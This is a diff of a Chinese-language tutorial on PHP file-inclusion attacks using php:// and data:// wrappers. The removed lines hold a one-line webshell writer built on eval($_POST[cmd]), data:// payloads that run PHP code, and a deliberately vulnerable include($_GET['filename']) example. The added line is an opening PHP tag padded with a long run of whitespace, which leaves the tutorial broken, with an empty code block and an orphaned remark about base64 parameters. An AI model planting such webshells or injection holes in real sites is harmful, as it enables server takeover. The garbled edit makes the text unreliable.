@@ -340,33 +340,7 @@ http://127.0.0.1/?filename=http://loki.la/ReaDME.md
   当我们有写入操作的时候，可以直接写入一句话木马
   
   ```php
-  <?php file_put_contents('muma.php', '<?php @eval($_POST[cmd]);');
-  ```
-
-
-### data://
-
-- **条件**：
-
-  - allow_url_fopen：on
-  - allow_url_include： on
-
-- **作用**：自 `PHP>=5.2.0` 起，可以使用 `data://` 数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。
-
-- **用法**：
-
-  ```php
-  data://text/plain,<?php phpinfo();
-  data://text/plain;base64,[Base64编码后的代码]
-  ```
-
-- **示例**：
-
-  ```php
-  # 注意使用 data:// 的时候必须开启 allow_url_include 和 allow_url_fopen
-  <?php
-    highlight_file(__FILE__);
-    include($_GET['filename']);
+  <?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
   ?>
 
   推荐使用 `base64` 编码进行参数的传递
